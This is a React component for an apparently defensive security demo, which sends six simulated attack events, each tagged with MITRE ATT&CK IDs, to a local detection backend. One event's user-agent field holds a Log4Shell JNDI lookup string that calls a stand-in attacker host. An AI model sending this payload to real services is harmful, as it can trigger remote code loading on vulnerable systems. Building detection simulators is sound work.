import React, { useState } from 'react';
import { Play, Loader, User, Globe, Lock, Package, ArrowRight, Database } from 'lucide-react';

/*
 * ScenarioSelector — 6-card attack simulation launcher.
 *
 * Each card represents a distinct attack vector that maps to different
 * MITRE ATT&CK techniques. Clicking "Execute" sends a POST /api/events
 * with the scenario-specific payload, triggering the full agent pipeline.
 *
 * GLOBAL RULE: No emojis. All icons are from lucide-react.
 */

const API_BASE = process.env.REACT_APP_API_URL || 'http://localhost:8080';

const SCENARIOS = [
  {
    id: 'credential-stuffing',
    label: 'T1078 · T1110.004',
    title: 'Credential Stuffing',
    meta: 'RU/Tor · ahmed@targetcorp.com · 23:00',
    icon: Globe,
    color: 'var(--danger)',
    payload: {
      actor: 'ahmed@targetcorp.com',
      sourceIp: '185.220.101.47',
      action: 'LOGIN',
      userAgent: 'python-requests/2.28.0',
      loginLatencyMs: 312,
      country: 'RU',
      hour: 23,
    },
  },
  {
    id: 'brute-force',
    label: 'T1110.001',
    title: 'Brute Force Login',
    meta: 'CN · admin@targetcorp.com · failedAttempts: 48',
    icon: Lock,
    color: 'var(--warning)',
    payload: {
      actor: 'admin@targetcorp.com',
      sourceIp: '103.86.96.100',
      action: 'LOGIN',
      userAgent: 'Hydra/9.3',
      loginLatencyMs: 80,
      country: 'CN',
      hour: 3,
      failedAttempts: 48,
    },
  },
  {
    id: 'lateral-movement',
    label: 'T1021',
    title: 'Lateral Movement',
    meta: 'Internal · user-001 -> asset-payroll',
    icon: ArrowRight,
    color: 'var(--accent)',
    payload: {
      actor: 'ahmed@targetcorp.com',
      sourceIp: '10.0.1.42',
      action: 'FILE_ACCESS',
      userAgent: 'SMBClient/1.0',
      loginLatencyMs: 900,
      country: 'PK',
      hour: 14,
      targetUser: 'payroll-service',
      filesAccessed: 120,
    },
  },
  {
    id: 'vulnerability-probe',
    label: 'T1190',
    title: 'Vulnerability Probe',
    meta: 'Log4Shell CVE-2021-44228 · AuthService',
    icon: Database,
    color: 'var(--danger)',
    payload: {
      actor: 'scanner@attackgroup.io',
      sourceIp: '45.33.32.156',
      action: 'EXPLOIT_ATTEMPT',
      // eslint-disable-next-line no-template-curly-in-string
      userAgent: '${jndi:ldap://attacker.io/x}',
      loginLatencyMs: 50,
      country: 'NL',
      hour: 11,
    },
  },
  {
    id: 'supply-chain',
    label: 'T1195.001',
    title: 'Typosquatting Package',
    meta: 'npm requessts · Levenshtein-1 from requests',
    icon: Package,
    color: 'var(--warning)',
    payload: {
      actor: 'build-agent@ci.targetcorp.com',
      sourceIp: '10.0.2.20',
      action: 'PACKAGE_INSTALL',
      userAgent: 'npm/9.8.1',
      loginLatencyMs: 0,
      country: 'PK',
      hour: 9,
      targetUser: 'requessts',
    },
  },
  {
    id: 'data-exfil',
    label: 'T1020',
    title: 'Data Exfiltration',
    meta: 'Insider · 14 GB upload to external host',
    icon: User,
    color: 'var(--danger)',
    payload: {
      actor: 'contractor@targetcorp.com',
      sourceIp: '192.168.4.88',
      action: 'DATA_UPLOAD',
      userAgent: 'rclone/v1.62.2',
      loginLatencyMs: 100,
      country: 'PK',
      hour: 1,
      dataVolumeGB: 14,
    },
  },
];

export default function ScenarioSelector({ incidentActive }) {
  const [runningId, setRunningId]   = useState(null);
  const [doneId,    setDoneId]      = useState(null);
  const [errId,     setErrId]       = useState(null);

  async function launch(scenario) {
    if (incidentActive || runningId) return;
    setRunningId(scenario.id);
    setDoneId(null);
    setErrId(null);

    try {
      const res = await fetch(`${API_BASE}/api/events`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...scenario.payload, timestamp: new Date().toISOString() }),
      });
      if (res.ok) {
        setDoneId(scenario.id);
      } else {
        setErrId(scenario.id);
      }
    } catch {
      setErrId(scenario.id);
    } finally {
      setTimeout(() => {
        setRunningId(null);
        setDoneId(null);
        setErrId(null);
      }, 4000);
    }
  }

  const isLocked = !!incidentActive || !!runningId;

  return (
    <div style={{ marginBottom: 16 }}>
      <div style={{
        display: 'flex', alignItems: 'center', gap: 8,
        marginBottom: 10,
      }}>
        <span style={{
          fontSize: 11, fontWeight: 700, color: 'var(--text-3)',
          letterSpacing: '0.06em', textTransform: 'uppercase',
        }}>
          Attack Scenarios
        </span>
        {incidentActive && (
          <span className="badge badge-danger" style={{ fontSize: 10 }}>
            Incident in progress — locked
          </span>
        )}
      </div>

      <div className="scenario-grid">
        {SCENARIOS.map(s => {
          const Icon      = s.icon;
          const isRunning = runningId === s.id;
          const isDone    = doneId    === s.id;
          const isErr     = errId     === s.id;
          const isActive  = isRunning || isDone;

          return (
            <div
              key={s.id}
              className={[
                'scenario-card',
                isActive  ? 'scenario-card--active'   : '',
                isLocked && !isActive ? 'scenario-card--disabled' : '',
              ].join(' ').trim()}
            >
              {/* Top row — icon + MITRE label */}
              <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                <Icon size={13} color={s.color} strokeWidth={2} />
                <span className="scenario-card__label">{s.label}</span>
              </div>

              <div className="scenario-card__title">{s.title}</div>
              <div className="scenario-card__meta">{s.meta}</div>

              <button
                className="scenario-card__run-btn"
                disabled={isLocked}
                onClick={() => launch(s)}
              >
                {isRunning ? (
                  <><Loader size={10} strokeWidth={2.5} style={{ animation: 'spin 1s linear infinite' }} /> Injecting...</>
                ) : isDone ? (
                  <><Play size={10} strokeWidth={2.5} /> Injected</>
                ) : isErr ? (
                  <><Play size={10} strokeWidth={2.5} /> Failed — retry</>
                ) : (
                  <><Play size={10} strokeWidth={2.5} /> Execute</>
                )}
              </button>
            </div>
          );
        })}
      </div>
    </div>
  );
}
